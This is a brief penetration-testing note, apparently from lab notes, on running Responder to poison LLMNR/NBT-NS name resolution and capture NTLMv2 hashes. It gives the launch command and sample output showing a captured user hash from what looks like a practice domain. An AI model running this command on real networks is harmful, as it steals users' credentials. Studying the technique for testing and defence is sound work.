---
# Responder
Responder is a tool to capture NTLMv2 hashes by running a "malicious" SMB server. If the environment has LLMNR or NBT-NS this is a good place to start.

1. Start Responder with 
```
responder -I eth0 -rdwv
```

2. Wait =)

If you are lucky you should see hashes coming through

```
[SMB] NTLMv2-SSP Client   : 10.130.140.81
[SMB] NTLMv2-SSP Username : HOGWARTS\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::HOGWARTS:12035a565c3b3ab5:415DA98A10FE9EBD8D5F7FC84989C940:  
```
